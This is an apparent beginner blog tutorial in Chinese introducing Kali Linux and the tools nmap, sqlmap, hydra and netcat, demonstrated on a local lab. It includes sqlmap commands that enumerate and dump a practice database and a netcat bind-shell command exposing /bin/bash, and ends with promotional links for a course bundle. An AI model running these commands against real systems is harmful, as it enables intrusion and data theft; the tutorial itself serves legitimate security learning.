
--- 
title:  kali linux入门及常用简单工具介绍 
tags: []
categories: [] 

---
### 前言

相信很多同学了解到和学习网络安全的时候都听过kali系统，大家都称之为黑客最喜爱的系统，那么什么是kali，初学者用kali能做些什么，我将在本文中做简单的介绍

### 一、kali linux是什么？

Kali Linux 是专门用于渗透测试的Linux操作系统，它由BackTrack发展而来。在整合了IWHAX、WHOPPIX和Auditor这三种渗透测试专用Live Linux后,BackTrack正式改名为Kali LInux。没错，kali的本质也是linux系统，就好比以前的黑客经常使用一些工具，久而久之的大家就共同开源了一个集成了各种黑客工具系统。至于为什么黑客都喜欢使用kali，主要是在kali中工具齐全避免了在需要使用的时候发现工具需要再下载安装的麻烦

<img src="https://img-blog.csdnimg.cn/img_convert/efe1bb4b705faf6fb9bcc25aed7b56ac.png" alt="">

### 二、安装下载kali

kali的官网地址：https://www.kali.org

目前kali仍然在保持着更新，目前最新的kali系统为kali purple，里面继承了更多的防守方使用的工具。

下载解压后用vm打开即可，默认root账号密码均为kali，kali。没有用过VMware的同学可以先到网上学习如何下载vm。另外新手可能会遇到虚拟机没有网络的问题，新手我这里推荐配置网卡时选择直接连接，等之后了解到网卡网段的知识可以再自己配置想要的网卡信息。（左上角虚拟机，设置，网络适配器，桥接模式，复制物理网络连接状态）

#### 三、kali常见工具介绍

<img src="https://img-blog.csdnimg.cn/img_convert/844e6229bc202ec7cf00da59db61f003.png" alt="">

正如刚才所说，kali里集成了大量的黑客工具和网络安全相关工具，可以说黑客需要做的所有事情在这个系统中都有工具可以实现。下面我推荐几个新手入门可以用到的小工具。

##### 1.nmap

nmap被称为诸神之眼，是一款非常强大的网络探测工具，可以实现主机发现和端口扫描，同时自身也可带漏洞扫描的脚本可以完成对主机端口的漏洞扫描

nmap最基础用法：

```
nmap [目的ip]
nmap 192.168.1.10

nmap [目的网段]
nmap 192.168.1.0/24

```

<img src="https://img-blog.csdnimg.cn/img_convert/6616d44eec760ff92933ec3513ace722.png" alt="">

map也提供了大量的扫描时候可以设置的参数，下面将举例常用的参数：

<img src="https://img-blog.csdnimg.cn/img_convert/468763a07a5dfe3965ef80b70ee38425.png" alt="">

<img src="https://img-blog.csdnimg.cn/img_convert/45823607fb728b7c2c1de1be607fb7c1.png" alt="">

添加参数可以显示出不同的扫描结果

##### 2.sqlmap

sqlmap是针对sql注入漏洞的一款自动化sql注入探测工具，支持多种操作系统环境和多种数据库的漏洞探测，渗透测试人员常常调侃“没有什么操作技术，就是sqlmap一把梭哈，屏幕显示绿了就直接下班”

sqlmap的基本使用:

```
sqlmap -u "www.baidu.com"

```

大家尽量不要在未授权的情况下去对公网资产进行批量扫描，小心去踩缝纫机哦

下面我以sqli-lab里面的靶场为例：

<img src="https://img-blog.csdnimg.cn/img_convert/28d316af86c8f42a4f156c629cb5d933.png" alt="">

出现图中绿色信息说明sqlmap对该参数成功注入，注意我的url中在最后以GET方式输入了参数id（/?id），如果不给sqlmap提供参数sqlmap是无法使用的哦

找到注入点后的步骤基本是确定的

```
 sqlmap -u "http://192.168.0.107/sqli/Less-1/?id=1"  --dbs  #获取当前数据库服务所开启的数据库名称
 sqlmap -u "http://192.168.0.107/sqli/Less-1/?id=1"  -D 数据库名 --tables  #获取某数据库下的所有表名
 sqlmap -u "http://192.168.0.107/sqli/Less-1/?id=1"  -D 数据库名 -T 表名 --columns #获取D数据库下T表内的所有字段
sqlmap -u "http://192.168.0.107/sqli/Less-1/?id=1"  -D 数据库名 -T 表名 -C 字段名 --dump  #将该字段的内容全部获取出来并存储，在最后的信息中会有存储路径信息

```

第一步获取数据库：

<img src="https://img-blog.csdnimg.cn/img_convert/9492c03ece2274b0829d42fb200f40ee.png" alt="">

第二步获取数据库下表名：

<img src="https://img-blog.csdnimg.cn/img_convert/79477d2e7a57fe998c30fcfd26215ed2.png" alt="">

第三步获取该表字段（其实到表名这一步可以直接–dump获取表里所有内容）

<img src="https://img-blog.csdnimg.cn/img_convert/1c78aebb2beedc758663cc5f6f4ecbee.png" alt="">

所以sqlmap的使用难处在于如何找到注入点，也就是找到产生sql注入的参数，在例子里参数是GET方式上传的“id”参数，下面提供一些sqlmap常用的参数

<img src="https://img-blog.csdnimg.cn/img_convert/dfed6738fc16bcd882966424685e133b.png" alt="">

##### 3.hydra

hydra又称九头蛇，是一款非常高效的多种协议都可以使用的爆破工具，对指定ip的指定服务进行爆破，需要输入爆破使用的字典或者自己指定爆破使用的数据（比如在已知账号为admin时爆破密码）

在kali中hydra有图形化和命令行两种使用方式

<img src="https://img-blog.csdnimg.cn/img_convert/204f7b6165fc20c9a2757432cfa6c52f.png" alt="">

对于新手来说，图形化界面更加简易好用，下面介绍图形化使用

<img src="https://img-blog.csdnimg.cn/img_convert/f6dd03dd2a552bbbeba047aebcd0cfda.png" alt="">

<img src="https://img-blog.csdnimg.cn/img_convert/ca697f6da5bbfebc86c47acd0fb0acca.png" alt="">

之后选择start就好了，hydra会使用字典中的所有账号密码去做登陆的爆破尝试

##### 4.netcat

netcat简称nc，是一款目前最常用网络工具，它提供基于socket协议套接字针对TCP，UDP连接的网络使用，在具有nc使用权时几乎可以建立任何类型的连接，通常在渗透测试中用该工具获得目的ip的shell

nc简单使用方式：建立连接传输信息

主机1：开启对6666端口的监听

```
nc -lvp 6666

```

参数解释：

<img src="https://img-blog.csdnimg.cn/img_convert/07bae59f11f8457034440aee8e0ac921.png" alt="">

主机2：连接主机1的6666端口

```
nc 192.168.0.163 6666

```

<img src="https://img-blog.csdnimg.cn/img_convert/665cf367bbd4a0f795300339d67db8cb.png" alt="">

nc常用使用：获取远程主机shell

1.正向连接shell

主机1：

```
nc -lvp 6666 -e /bin/bash

```

参数解释：

<img src="https://img-blog.csdnimg.cn/img_convert/8268e8f08ccd106672fe5714f2e7b25c.png" alt="">

这里将主机1的/bin/bash重定向到了自己主机的6666端口

主机2：

```
nc 192.168.0.163 6666

```

<img src="https://img-blog.csdnimg.cn/img_convert/4707740a23efb159eb97920c5bd59561.png" alt="">

大家可以思考一下为什么左边会有下面的报错呢？并且在执行sudo su尝试进入root权限时，必须在左侧主机输入密码才可以进入，进入后才会收到来自右侧发来的密码kali并且产生报错。可以尝试了解不同终端bash/zsh/sh的区别

### 总结

本文简单介绍了kali系统，只是适合对没有了解过的新手小白的一个引导

### 网络安全学习资源分享:

**给大家分享一份全套的网络安全学习资料，给那些想学习 网络安全的小伙伴们一点帮助！**

对于从来没有接触过网络安全的同学，我们帮你准备了详细的学习成长路线图。可以说是最科学最系统的学习路线，大家跟着这个大的方向学习准没问题。

因篇幅有限，仅展示部分资料，朋友们如果有需要<mark>全套《**网络安全入门+进阶学习资源包**》</mark>，需要<mark>点击下方链接</mark>即可前往获取

`**读者福利 |** ` **** `**（安全链接，放心点击）**`

<img src="https://img-blog.csdnimg.cn/img_convert/db6d58f21b2b30801b6a24fbe7ba9c39.png#pic_center" alt="图片">

同时每个成长路线对应的板块都有配套的视频提供：

<img src="https://img-blog.csdnimg.cn/img_convert/96faf31d16ee5429d8c3b04ecd85f477.jpeg#pic_center" alt="图片">

### 实战训练营

<img src="https://img-blog.csdnimg.cn/8f5cfdeb776b43048053db65a56e28a4.png#pic_center" alt="在这里插入图片描述">

### 面试刷题

<img src="https://img-blog.csdnimg.cn/194061b77023455eb8b1c75d1084191f.png#pic_center" alt="在这里插入图片描述">

**视频配套资料&amp;国内外网安书籍、文档**

当然除了有配套的视频，同时也为大家整理了各种文档和书籍资料

<img src="https://img-blog.csdnimg.cn/img_convert/8be1afdcca061c7e2987f41619464228.png#pic_center" alt="图片"> **所有资料共282G，朋友们如果有需要全套《网络安全入门+进阶学习资源包》，可以扫描下方二维码或链接免费领取~**

`**读者福利 |** ` **** `**（安全链接，放心点击）**`
